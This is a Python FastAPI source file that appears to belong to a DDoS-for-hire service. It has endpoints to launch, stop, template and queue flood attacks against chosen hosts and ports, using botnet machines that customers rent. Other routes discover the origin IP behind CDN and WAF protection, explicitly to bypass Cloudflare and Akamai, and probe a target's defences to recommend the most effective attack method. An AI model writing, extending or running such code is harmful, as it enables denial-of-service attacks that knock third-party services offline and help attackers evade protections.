from fastapi import APIRouter, Depends, HTTPException
from uuid import UUID
from pydantic import BaseModel, ConfigDict
from typing import Optional, List
from sqlalchemy import select, func
from app.auth import get_current_user
from app.database import async_session
from app.models.all_models import User, AttackTemplate, AttackQueue
from app.schemas.all_schemas import AttackCreate, AttackOut
from app.services.attack_service import AttackService
from app.services.ai_analysis import detect_defense, auto_select_method, get_method_scores
from app.services.origin_discovery import discover_origin

router = APIRouter(prefix="/api/attacks", tags=["attacks"])


class DefenseDetectRequest(BaseModel):
    target_host: str
    target_port: int = 443


class OriginDiscoverRequest(BaseModel):
    domain: str


@router.post("/origin-discover")
async def origin_discover(data: OriginDiscoverRequest, current_user: User = Depends(get_current_user)):
    """Find the real IP behind CDN/WAF. Bypass Cloudflare/Vietnix/Akamai."""
    result = await discover_origin(data.domain)
    return result


@router.post("/detect")
async def detect_target_defense(data: DefenseDetectRequest, current_user: User = Depends(get_current_user)):
    """AI-powered defense detection — probes target and recommends attack method."""
    result = await detect_defense(data.target_host, data.target_port)
    scores = get_method_scores(result["defense_type"])
    return {
        **result,
        "method_scores": {k: v for k, v in sorted(scores.items(), key=lambda x: -x[1])},
        "best_method": result["recommended_methods"][0] if result["recommended_methods"] else "MEGA",
    }

@router.post("/launch", response_model=AttackOut)
async def launch_attack(data: AttackCreate, current_user: User = Depends(get_current_user)):
    try:
        task = await AttackService.launch(current_user, data)
        return AttackOut.model_validate(task)
    except HTTPException:
        raise
    except ValueError as e:
        raise HTTPException(400, str(e))
    except Exception as e:
        raise HTTPException(500, str(e))

@router.post("/{task_id}/stop")
async def stop_attack(task_id: UUID, current_user: User = Depends(get_current_user)):
    await AttackService.stop(task_id, current_user)
    return {"status": "stopped", "task_id": str(task_id)}

@router.get("/mine")
async def my_attacks(current_user: User = Depends(get_current_user)):
    tasks = await AttackService.get_user_tasks(current_user.id)
    return [AttackOut.model_validate(t) for t in tasks]

@router.get("/active")
async def active_attacks(current_user: User = Depends(get_current_user)):
    if current_user.role == "admin":
        tasks = await AttackService.get_active_tasks()
    else:
        tasks = await AttackService.get_active_tasks(user_id=current_user.id)
    return [AttackOut.model_validate(t) for t in tasks]

@router.get("/stats/me")
async def my_stats(current_user: User = Depends(get_current_user)):
    """User-facing dashboard stats (no admin required)."""
    from app.database import async_session
    from app.models.all_models import Bot, AttackTask
    from sqlalchemy import select, func
    async with async_session() as s:
        my_bots = (await s.execute(
            select(func.count(Bot.id)).where(Bot.rented_by_user_id == current_user.id)
        )).scalar() or 0
        my_online = (await s.execute(
            select(func.count(Bot.id)).where(
                Bot.rented_by_user_id == current_user.id, Bot.status == "online"
            )
        )).scalar() or 0
        active = (await s.execute(
            select(func.count(AttackTask.id)).where(
                AttackTask.user_id == current_user.id, AttackTask.status == "running"
            )
        )).scalar() or 0
        pkts = (await s.execute(
            select(func.coalesce(func.sum(AttackTask.total_packets), 0)).where(
                AttackTask.user_id == current_user.id
            )
        )).scalar() or 0
        bytes_ = (await s.execute(
            select(func.coalesce(func.sum(AttackTask.total_bytes), 0)).where(
                AttackTask.user_id == current_user.id
            )
        )).scalar() or 0
    return {
        "my_bots": my_bots,
        "my_online_bots": my_online,
        "active_attacks": active,
        "total_packets": int(pkts),
        "total_bandwidth_gb": round(float(bytes_) / 1e9, 2),
        "role": current_user.role,
        "username": current_user.username,
    }


# ── Attack Templates ──
class TemplateCreate(BaseModel):
    name: str
    target_host: str
    target_port: int = 80
    method: str = "MEGA"
    duration_secs: int = 60
    bot_count: int = 1

class TemplateOut(BaseModel):
    model_config = ConfigDict(from_attributes=True)
    id: UUID
    name: str
    target_host: str
    target_port: int
    method: str
    duration_secs: int
    bot_count: int

@router.get("/templates", response_model=List[TemplateOut])
async def list_templates(current_user: User = Depends(get_current_user)):
    async with async_session() as s:
        r = await s.execute(select(AttackTemplate).where(AttackTemplate.user_id == current_user.id))
        return r.scalars().all()

@router.post("/templates", response_model=TemplateOut)
async def create_template(data: TemplateCreate, current_user: User = Depends(get_current_user)):
    async with async_session() as s:
        t = AttackTemplate(user_id=current_user.id, **data.model_dump())
        s.add(t); await s.commit(); await s.refresh(t)
        return t

@router.delete("/templates/{template_id}")
async def delete_template(template_id: UUID, current_user: User = Depends(get_current_user)):
    async with async_session() as s:
        t = (await s.execute(select(AttackTemplate).where(
            AttackTemplate.id == template_id, AttackTemplate.user_id == current_user.id
        ))).scalar_one_or_none()
        if not t: raise HTTPException(404, "Template not found")
        await s.delete(t); await s.commit()
    return {"status": "deleted"}

@router.post("/templates/{template_id}/launch", response_model=AttackOut)
async def launch_template(template_id: UUID, current_user: User = Depends(get_current_user)):
    async with async_session() as s:
        t = (await s.execute(select(AttackTemplate).where(
            AttackTemplate.id == template_id, AttackTemplate.user_id == current_user.id
        ))).scalar_one_or_none()
        if not t: raise HTTPException(404, "Template not found")
    return await AttackService.launch(current_user, AttackCreate(
        target_host=t.target_host, target_port=t.target_port,
        method=t.method, duration_secs=t.duration_secs, bot_count=t.bot_count,
    ))


# ── Attack Queue ──
class QueueOut(BaseModel):
    model_config = ConfigDict(from_attributes=True)
    id: UUID
    target_host: str
    target_port: int
    method: str
    duration_secs: int
    bot_count: int
    status: str
    created_at: Optional[str] = None

@router.get("/queue")
async def list_queue(current_user: User = Depends(get_current_user)):
    async with async_session() as s:
        r = await s.execute(select(AttackQueue).where(
            AttackQueue.user_id == current_user.id,
            AttackQueue.status.in_(["queued", "running"]),
        ).order_by(AttackQueue.created_at.desc()))
        items = r.scalars().all()
        return [{"id": str(i.id), "target_host": i.target_host, "target_port": i.target_port,
                 "method": i.method, "duration_secs": i.duration_secs,
                 "bot_count": i.bot_count, "status": i.status,
                 "created_at": i.created_at.isoformat() if i.created_at else None} for i in items]

@router.delete("/queue/{queue_id}")
async def cancel_queue(queue_id: UUID, current_user: User = Depends(get_current_user)):
    async with async_session() as s:
        q = (await s.execute(select(AttackQueue).where(
            AttackQueue.id == queue_id, AttackQueue.user_id == current_user.id
        ))).scalar_one_or_none()
        if not q: raise HTTPException(404, "Queue item not found")
        if q.status == "queued":
            await s.delete(q); await s.commit()
        else:
            q.status = "cancelled"; await s.commit()
    return {"status": "cancelled"}